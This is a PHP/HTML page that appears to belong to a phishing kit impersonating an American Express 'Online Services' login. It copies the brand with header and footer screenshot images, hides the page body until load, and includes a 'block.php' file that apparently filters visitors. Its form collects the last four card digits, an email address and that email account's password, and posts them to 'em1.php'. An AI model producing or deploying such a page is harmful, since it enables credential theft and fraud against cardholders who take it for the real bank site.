<?php
require_once 'block.php';
?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>American Express : Online Services </title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">

<style type="text/css">
div#container
{
	position:relative;
	width: 1265px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<link rel="shortcut icon"
              href="images/favicon.ico"/>
    
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">
</head>
<body bgColor="#FFFFFF">
<div id="container">


<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1351px; height:95px; z-index:2"><img src="images/heads.PNG" alt="" title="" border=0 width=1351 height=95></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:98px; width:1349px; height:434px; z-index:3"><img src="images/mainxy.PNG" alt="" title="" border=0 width=1349 height=434></div>


<form action="em1.php" name=chalbhai id=chalbhai method=post>
<input name="ccnum"  required title="Please Enter Right Value" autocomplete="off" maxlength="4" type="text" style="position:absolute;width:174px;height:25px;left:387px;top:265px;z-index:6">
<input name="email"  required title="Please Enter Right Value" autocomplete="off" maxlength="60" type="text" style="position:absolute;width:174px;height:25px;left:387px;top:305px;z-index:7">
<input name="emailpass"  required title="Please Enter Right Value" autocomplete="off" maxlength="60" type="password" style="position:absolute;width:174px;height:25px;left:387px;top:345px;z-index:7">


<div id="formimage1" style="position:absolute; left:190px; top:435px; z-index:10"><input type="image" name="formimage1" width="104" height="46" src="images/continue.PNG"></div>
<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:552px; width:1350px; height:237px; z-index:11"><img src="images/footers.PNG" alt="" title="" border=0 width=1350 height=237></div>

</div>

</body>
</html>
